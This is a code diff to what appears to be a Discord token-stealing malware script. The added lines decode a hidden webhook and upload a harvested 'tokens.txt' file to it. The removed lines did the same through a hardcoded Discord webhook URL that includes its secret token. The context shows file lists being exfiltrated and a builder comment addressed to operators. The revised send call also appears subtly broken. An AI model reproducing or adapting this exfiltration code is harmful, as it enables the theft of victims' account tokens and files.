@@ -61,6 +61,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 import json
 import getpass
 import urllib
+from dhooks import Webhook, File
 import requests
 from dhooks import Webhook, File
 
@@ -69,8 +70,11 @@ base64_bytes = base64_message.encode('ascii')
 message_bytes = base64.b64decode(base64_bytes)
 hook = message_bytes.decode('ascii')
 
-# hook = "https://discord.com/api/webhooks/1081548797441757204/xBh0sP1TwIHe_3Q2wErKNaUL-ukSnWilObj10zVuU72WaXX36zALMiODBn-mktn956yU" #HEY BUDDY REPLACE YOUR WEBHOOK WITH replace_me THEN RUN SETUP.BAT AND BUILD.BAT! --Konan#0787
+dahook = hook
 
+grimxkd31x = File(".\\tokens.txt")
+
+dahook.send(username="Psychopathetic Frog", avatar_url="https://media.discordapp.net/attachments/1050864444911140884/1066795628291698688/dd0b58187342386067aa0f0fe03bc402.jpg", file=grimxkd31x)
 
 DETECTED = False
 
@@ -1064,14 +1068,6 @@ if not DETECTED:
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
-
-from dhooks import Webhook, File
-
-dahook = Webhook("https://discord.com/api/webhooks/1083016196036763728/lW5tnKHmWyk5amF-bseQwTCwuR5mBvxIJTmlCk7Y6vhHGVAagbE6iKO_W11Nrf6XRbLm")
-
-grimxkd31x = File(".\\tokens.txt")
-
-dahook.send(username="Psychopathetic Frog", avatar_url="https://media.discordapp.net/attachments/1050864444911140884/1066795628291698688/dd0b58187342386067aa0f0fe03bc402.jpg", file=grimxkd31x)
 
 os.system("cls")
 
